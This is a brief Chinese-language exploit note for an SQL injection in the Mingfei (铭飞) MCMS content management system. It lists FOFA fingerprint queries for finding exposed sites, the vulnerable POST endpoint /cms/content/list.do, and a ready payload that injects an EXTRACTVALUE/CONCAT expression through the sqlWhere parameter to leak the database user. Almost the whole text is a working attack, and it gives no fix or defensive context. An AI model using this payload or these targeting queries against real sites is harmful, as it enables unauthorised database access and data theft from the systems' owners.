# 铭飞CMS-list-SQL注入漏洞复现

铭飞CMS-list ｜ SQL注入 ｜ —
- **指纹**：`FOFA：body="铭飞MCMS" ｜  body="/mdiy/formData/save.do" ｜  body="static/plugins/ms/1.0.0/ms.js"`
- **请求**：`POST /cms/content/list.do HTTP/1.1`

**Payload**
```
sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select user()),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]
```